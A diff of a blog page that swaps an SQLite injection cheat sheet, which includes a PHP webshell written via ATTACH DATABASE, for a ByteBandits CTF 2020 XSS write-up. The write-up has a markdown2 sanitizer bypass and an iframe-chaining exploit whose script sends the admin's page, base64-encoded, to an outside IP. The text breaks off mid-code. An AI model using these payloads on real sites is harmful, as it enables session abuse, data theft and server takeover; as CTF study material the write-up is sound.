@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlite, M0on&#39;s Blog">
-    <meta name="description" content="不忘初心">
+    <meta name="keywords" content="ByteBandits CTF 2020部分writeup-notesapp, M0on&#39;s Blog">
+    <meta name="description" content="Byte-Bandits-CTF2020 部分writeup-notesapp">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqlite | M0on&#39;s Blog</title>
+    <title>ByteBandits CTF 2020部分writeup-notesapp | M0on&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -232,12 +232,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqlite</h1>
+                    <h1 class="description center-align post-title">ByteBandits CTF 2020部分writeup-notesapp</h1>
                 </div>
             </div>
         </div>
@@ -358,8 +358,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/sql/">
-                                <span class="chip bg-color">sql</span>
+                            <a href="/tags/xss/">
+                                <span class="chip bg-color">xss</span>
                             </a>
                         
                     </div>
@@ -383,7 +383,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-14
+                    2020-04-12
                 </div>
                 
 
@@ -392,14 +392,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    9 分
                 </div>
                 
 
@@ -415,224 +415,322 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p>
-<h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;
-1234    </code></pre>
-<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p>
-<p>/* */</p>
-<h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p>
-<h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul>
-<li>null</li>
-<li>integer</li>
-<li>real 浮点数</li>
-<li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li>
-<li>BLOB blob根据输入存储</li>
-</ul>
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p>
-<pre><code>sqlite&gt; .databases #检查是否在数据库列表
-main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul>
-<li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';
-sqlite> .database
-main: /root/download/test.db
-haah: /root/download/shell.db</code></pre>
-</li>
-</ul>
-<h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示
-PRAGMA foreign_keys=OFF;
-BEGIN TRANSACTION;
-COMMIT;</code></pre>
-<pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre>
-<h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p>
-<h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (
-  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
-  `name` TEXT NOT NULL,
-  `count` INTEGER
-);</code></pre>
-<h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES
-  ('dog', 0),
-  ('cat', 0),
-  ('zebra', 0),
-  ('koala', 0);</code></pre>
-<h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p>
-<ul>
-<li>*</li>
-</ul>
-<ul>
-<li>?</li>
-</ul>
-<pre><code>sqlite&gt; select * from vote where name GLOB 'do?';
-id          name        count     
-----------  ----------  ----------
-1           dog         0
-</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p>
-<h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');
-coalesce(null,'a','a')
-----------------------
-a         </code></pre>
-<pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');
-coalesce(nullif(2,2),'hah')
----------------------------
-hah              </code></pre>
-<p>相当于 if 2=2 return hah else null</p>
-<h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul>
-<li>nullif</li>
-</ul>
-<p>两个参数，nullif(a,b),如果a和b相等返回 null</p>
-<p>如果a和b不想等，返回 a</p>
-<ul>
-<li>ifnull </li>
-</ul>
-<p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p>
-<p>如果都为null，返回null</p>
-<h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p>
-<h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p>
-<p>可以用 _ % </p>
-<pre><code>sqlite&gt; select like('ab_','abc');
-like('ab_','abc')
------------------
-1          </code></pre><ul>
-<li>like可以有第三个参数，</li>
-</ul>
-<p>相当于like语句的 ESCAPE ，转义</p>
-<p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p>
-<p>而不是匹配符号 </p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');
-like('barz_','bar_','z')
-------------------------
-1             </code></pre>
-<p>这里把 z 用作 和 \ 类似的作用</p>
-<h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p>
-<ul>
-<li>一个参数 返回删除左侧空格的字符串</li>
-<li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');
-ltrim('aaaa bc','a')
-bc</code></pre>
-</li>
-</ul>
-<h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');
-printf("aw%s",'sl')
-awsl</code></pre>
-<h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p>
-<pre class=" language-cookie"><code class="language-cookie">平常：
-sqlite> select 1233;
-1233      
-----------
-1233      
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃了不会前端的大亏，下午的时候一度要做出来了，思路完全对了</p>
+<p>编写利用过程失败了，最后就差<code>js</code>获取<code>iframe</code>内容那么一点卡住了很久，最后改了几个字符就成功了</p>
+<p>网上一搜一页基本上都是复制粘帖的，果然不能总靠临时学习，吐了</p>
+<p>这次比赛过后下定决心好好学一下<code>js</code></p>
+<h2 id="源代码和大概内容"><a href="#源代码和大概内容" class="headerlink" title="源代码和大概内容"></a>源代码和大概内容</h2><p><strong>main.py</strong></p>
+<pre><code>import os
+from flask import Flask, render_template, request, flash, redirect
+from flask_sqlalchemy import SQLAlchemy
+from flask_login import LoginManager
+from flask_login import login_required, logout_user, current_user, login_user
+import markdown2
+import requests
 
-quote:
-sqlite> SELECT quote('1233');
-quote('1233')
--------------
-'1233'    </code></pre>
-<h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p>
-<h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p>
-<p>如果很长可以造成时间盲注</p>
-<h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');
-replace('a{ab}','a','b')
-------------------------
-b{bb}            </code></pre>
-<h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p>
-<p>开眼界了</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');
-soundex('a')
-------------
-A000       </code></pre>
-<h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p>
-<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');
-unicode('a')
-------------
-97         
+from .models import User
+from . import db, create_app, login_manager
+from .visit_link import q, visit_url
 
-sqlite> select unicode('哈');
-unicode('哈')
-------------
-21704     </code></pre>
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';
-CREATE TABLE m0on.shell_haha(`haha` text);
-INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');
-</code></pre>
-<p>cat /tmp/good.php</p>
-<pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';
-select tbl_name from sqlite_master where type='table';</code></pre>
-<h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';
+app = create_app()
+
+# configure login_manager {{{1 #
+@login_manager.user_loader
+def load_user(user_id):
+    """Check if user is logged-in on every page load."""
+    if user_id is not None:
+        return User.query.get(user_id)
+    return None
 
 
-sqlite> select sql from sqlite_master where name='shell';
-sql                             
---------------------------------
-CREATE TABLE shell(first,second)
+@login_manager.unauthorized_handler
+def unauthorized():
+    """Redirect unauthorized users to Login page."""
+    flash('You must be logged in to view that page.')
+    return redirect("/login")
+# 1}}} #
 
-列名是 first 和 second</code></pre>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));
-select substr('abc',1,1);</code></pre>
-<p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p>
-<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre>
-<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p>
-<pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre>
-<p>或者</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre>
-<p>语句类似mysql不说了</p>
-<h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * ?</p>
-<pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 
-'abc' GLOb 'a*'
----------------
-1          </code></pre>
-<h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p>
-<p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p>
-<pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre>
-<p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p>
-<p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p>
-<pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21
-select nullif(instr('abca','a'),1)||1;  //null
-select nullif(instr('abca','ab'),1)||1; //null</code></pre>
-<h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p>
-<pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre>
-<p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p>
-<p>如果爆破的字符串正确，那么length就会减少</p>
-<h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p>
-<pre class=" language-cookie"><code class="language-cookie">select  
-length(replace('flag{aza}','flag{a',''))=3;
-//1 
+# configure routes {{{1 #
+@app.route("/")
+def index():
+    if current_user.is_authenticated:
+        return redirect("/profile")
+    return render_template("index.html")
 
-select length(replace('flag{aza}','flag{b',''))=3;
-//0</code></pre>
-<h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre>
-<p>nullif 和 length 和ltrim 配合</p>
-<p>如果 正确返回<code>null</code></p>
-<h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1
-select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre>
-<h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul>
-<li><p>ifnull可以用<code>coalesce()</code>函数代替</p>
-</li>
-<li><p><code>abs()</code>函数存在整形溢出</p>
-</li>
-<li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);
-Error: hex literal too big: 0x99999999999999999</code></pre>
-<p>所以基于报错的注入：</p>
-</li>
-</ul>
-<p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p>
-<pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));
-Error: integer overflow
+@app.route("/register", methods = ["GET", "POST"])
+def register():
+    if current_user.is_authenticated:
+        return redirect("/profile")
 
-select abs(ifnull(nullif(1,2),0x8000000000000000));
-2</code></pre>
-<h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p>
-<pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' 
-then randomblob(1000000) 
-else 0 end;</code></pre>
-<h3 id="CREATE注入"><a href="#CREATE注入" class="headerlink" title="CREATE注入"></a>CREATE注入</h3><p>语句 :</p>
-<pre><code>create table [xx] as select</code></pre><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><p>这样就是 <code>(123</code> 为列名， type 默认是 TEXT</p>
-<p>创造一个表 <code>aa</code> ，</p>
-<p>数据是从 <code>sec_tb</code> 的 <code>a1</code>列 复制过去的数据</p>
-<p><strong>获取表:</strong></p>
-<pre><code>CREATE TABLE [cc] as select [sql][(123] from sqlite_master ;</code></pre><p><strong>获取数据</strong></p>
-<pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><script>
+    if request.method == 'POST':
+        # register user
+        id = request.form.get('username')
+        password = request.form.get('password')
+        existing_user = User.query.filter_by(id = id).first()  # Check if user exists
+        if existing_user is None:
+            user = User(id = id)
+            user.set_password(password)
+            user.notes = ""
+            db.session.add(user)
+            db.session.commit()  # Create new user
+            login_user(user)  # Log in as newly created user
+            return redirect("/profile")
+        flash('A user already exists with that name already exists.')
+        return redirect("/register")
+    return render_template("register.html")
+
+@app.route("/login", methods = ["GET", "POST"])
+def login():
+    if current_user.is_authenticated:
+        return redirect("/profile")
+
+    if request.args.get("username"):
+        # register user
+        id = request.args.get('username')
+        password = request.args.get('password')
+        user = User.query.filter_by(id = id).first()
+        if user and user.check_password(password = password):
+            login_user(user)
+            return redirect("/profile")
+
+        flash('Incorrect creds')
+        return redirect("/login")
+    return render_template("login.html")
+
+@app.route("/visit_link", methods=["GET", "POST"])
+def visit_link():
+    if request.method == "POST":
+        url = request.form.get("url")
+        token = request.form.get("g-recaptcha-response")
+        r = requests.post("https://www.google.com/recaptcha/api/siteverify", data = {
+            'secret': os.environ.get('RECAPTCHA_SECRET'),
+            'response': token
+        })
+        if r.json()['success']:
+            job = q.enqueue(visit_url, url, result_ttl = 600)
+            flash("Our admin will visit the url soon.")
+            return render_template("visit_link.html", job_id = job.id)
+        else:
+            flash("Recaptcha verification failed")
+
+    return render_template("visit_link.html")
+
+@app.route("/status")
+def status():
+    job_id = request.args.get('job_id')
+    job = q.fetch_job(job_id)
+    status = job.get_status()
+    return render_template("status.html", status = status)
+
+
+@app.route("/profile")
+@login_required
+def profile():
+    return render_template("profile.html", current_user = current_user)
+
+@app.route("/update_notes", methods=["POST"])
+@login_required
+def update_notes():
+    # markdown support!!
+    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)
+    db.session.commit()
+    return redirect("/profile")
+
+
+@app.route("/logout")
+@login_required
+def logout():
+    logout_user()
+    return redirect("/")
+# 1}}} #
+</code></pre><p>是一个<code>xss</code>挑战，提交<code>url</code>可以让<code>admin</code>去访问</p>
+<p>而 <code>visit_link.py</code>的部分内容是这样</p>
+<pre><code>async def main(url):
+    browser = await launch(headless=True,
+                           executablePath="/usr/bin/chromium-browser",
+                           args=['--no-sandbox', '--disable-gpu'])
+    page = await browser.newPage()
+    await page.goto("https://notes.web.byteband.it/login")
+    await page.type("input[name='username']", "admin")
+    await page.type("input[name='password']", os.environ.get("ADMIN_PASS"))
+    await asyncio.wait([
+        page.click('button'),
+        page.waitForNavigation(),
+    ])
+    await page.goto(url)
+    await browser.close()
+
+
+def visit_url(url):
+    asyncio.get_event_loop().run_until_complete(main(url))</code></pre><p>打开<code>chrome</code>浏览器然后登录<code>admin</code>后访问提交的页面</p>
+<p>然后看到 <code>main.py</code></p>
+<pre><code>@app.route("/update_notes", methods=["POST"])
+@login_required
+def update_notes():
+    # markdown support!!
+    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)
+    db.session.commit()
+    return redirect("/profile")
+</code></pre><p>授权登录后可以编辑<code>notes</code>,使用<code>markdown2</code></p>
+<p>看到<code>github</code>上的<code>issues</code></p>
+<p><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a></p>
+<p>可以绕过造成 <code>xss</code></p>
+<pre><code>&gt;&gt;&gt; import markdown2
+&gt;&gt;&gt; markdown2.markdown('&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;', safe_mode=True)
+'&lt;p&gt;&lt;http://g&lt;!s://q?&lt;!-&amp;lt;&lt;a href="http://g"&gt;&lt;script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&amp;lt;&lt;a href="http://g"&gt;a\\*/&lt;/script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;/p&gt;\n'
+&gt;&gt;&gt; </code></pre><p>所以这是个 <code>authenticated XSS</code>，需要登录才可以利用</p>
+<p>在<code>login</code>内容</p>
+<pre><code>@app.route("/login", methods = ["GET", "POST"])
+def login():
+    if current_user.is_authenticated:
+        return redirect("/profile")
+。。。。
+        id = request.args.get('username')
+        password = request.args.get('password')
+</code></pre><p>可以看到用的是 <code>request.args.get</code></p>
+<p>也就是可以使用 <code>GET</code>来登录，</p>
+<p>而<code>flag</code>在<code>admin_user.notes = os.environ.get("FLAG")</code></p>
+<p>也就是<code>admin</code>页面的<code>notes</code>就是<code>flag</code>了</p>
+<p>所以只要利用<code>xss</code>获取那个页面内容就可以了</p>
+<p>至于<code>盗取cookie</code>的话，因为<code>cookie</code>使用了 <code>httponly</code></p>
+<p>无法通过<code>js</code>来访问，加上这样的利用条件应该无法盗用了</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果已经登录了，浏览器拥有那个<code>cookie</code>，然后有一个<code>iframe</code>，那么<code>iframe</code>可以获取那个<code>cookie</code></p>
+<p><a href="https://www.chromium.org/updates/same-site" target="_blank" rel="noopener">chromium same-site update</a></p>
+<p>所以变得明显起来了</p>
+<p>构造一个页面，嵌入一个<code>iframe</code>是admin的<code>profile</code>内容，包含了<code>flag</code></p>
+<p>然后加载完这个<code>iframe</code>后再构造<code>iframe</code>退出登录</p>
+<p>然后构造<code>iframe</code>登录到自己的帐号，里面有<code>xss</code></p>
+<p>有一点是因为自己构造的页面和题目页面是跨域的，在自己页面无法访问那个<code>admin profile</code></p>
+<p>所以<code>xss</code>就有用场了，<code>xss</code>页面和<code>admin profile</code>的<code>iframe</code>是同源的,</p>
+<p>那么<code>iframe</code>之间获取内容</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一个注意的点-输出-等待-输出的方式"><a href="#一个注意的点-输出-等待-输出的方式" class="headerlink" title="一个注意的点 输出-等待-输出的方式"></a>一个注意的点 输出-等待-输出的方式</h3><p>因为题目打开浏览器浏览打开访问页面后立刻关闭</p>
+<pre><code>    await page.goto(url)
+    await browser.close()</code></pre><p>在短时间内，可能无法执行完成<code>js</code>脚本</p>
+<p>所以缓冲区输出然后<code>sleep(10)</code> 停几秒，让浏览器没那么快加载完资源</p>
+<p>就可以执行<code>js</code>脚本了</p>
+<pre><code>&lt;?php
+
+echo 123333;
+ob_flush();
+flush();
+
+?&gt;
+&lt;?php
+sleep(10);
+?&gt;</code></pre><p>这样</p>
+<p>在我的 <code>vps</code>上面写两个页面</p>
+<p>一个<code>cli.php</code> ,一个<code>10.php</code></p>
+<p><code>cli.php</code>是<code>update_notes</code> 更改我的<code>xss</code>内容</p>
+<p>而 <code>10.php</code> 就是交给admin去访问的</p>
+<p>一些无用的内容多了一点，懒得删除了，<code>cli.php</code>掉入坑里了，烦</p>
+<h3 id="10-php"><a href="#10-php" class="headerlink" title="10.php"></a>10.php</h3><pre><code>&lt;?php
+header('access-control-allow-origin:*');?&gt;
+
+&lt;html&gt;
+&lt;/html&gt;
+
+
+&lt;script&gt;
+    i=document.createElement("iframe");
+    i.src="https://notes.web.byteband.it/profile";
+    i.id="pwn";
+    i.name="pwn";
+    var state = 0;
+    document.body.appendChild(i);
+
+
+
+    i.onload=function () {
+        j=document.createElement("iframe");
+        j.src="https://notes.web.byteband.it/logout";
+        j.id="pwn2";
+        document.body.appendChild(j);
+
+
+        j.onload=function () {
+            k=document.createElement("iframe");
+            k.src="https://notes.web.byteband.it/login?username=mo0n&amp;password=mo0n";
+            k.id="pwn3";
+            document.body.appendChild(k);
+
+            k.onload=function () {
+                l=document.createElement("iframe");
+                l.src="http://47.92.94.199/cli.php";
+                l.id="pwn4";
+                document.body.appendChild(l);
+
+                l.onload=function () {
+                    m=document.createElement("iframe");
+                    m.src="https://notes.web.byteband.it/profile";
+                    m.id="pwn5";
+                    document.body.appendChild(m);
+                    console.log(i)
+
+                }
+
+            }
+        }
+    }
+
+&lt;/script&gt;
+
+&lt;?php
+
+echo 123333;
+ob_flush();
+flush();
+
+?&gt;
+&lt;?php
+sleep(10);
+?&gt;
+</code></pre><h3 id="cli-php"><a href="#cli-php" class="headerlink" title="cli.php"></a>cli.php</h3><p>这个的<code>js</code>内容就是卡住的地方，如果会<code>javascript</code>的话早就做出来了，吐了</p>
+<p>搜索网上内容</p>
+<p>给出的<code>兄弟iframe通信</code>得到的是<code>window.parent.document.getElementById("pwn")</code></p>
+<p>这样的，但是这个是不行的，</p>
+<p>在本地测试是无法获取这个<code>admin 的iframe</code>，得到是<code>null</code></p>
+<p>一度怀疑</p>
+<h4 id="可行的一个是"><a href="#可行的一个是" class="headerlink" title="可行的一个是"></a>可行的一个是</h4><pre><code>
+top.pwn.document.body.innerHTML
+
+这个pwn是 i.name="pwn"</code></pre><h4 id="一个注意的点"><a href="#一个注意的点" class="headerlink" title="一个注意的点"></a>一个注意的点</h4><p>随后因为获取<code>html</code>内容带有<code>&lt;</code> 这些，<code>chromium</code>浏览器禁止跳转</p>
+<p>所以只要把它们变成<code>base64</code>就可以了</p>
+<pre><code>&lt;?php
+
+file_put_contents('flagggggggggggggggggg','yes');
+echo 123;
+
+
+
+$js='try{var x = window.parent.document.getElementById("pwn");console.log(x);var right = (x.contentWindow || x.contentDocument);if(right.document){right = right.document;window.location="http://47.92.94.199/flag.php?good="+right;}}catch{console.log(123333);}';
+
+$js='try{var x= window.parent.document.getElementById("pwn5");console.log(12);}catch(err){console.log("false")}';
+
+$js='x=top.pwn.document.body.innerHTML;console.log(x);window.location="http://47.92.94.199/flag.php?good="+btoa(x);';
+
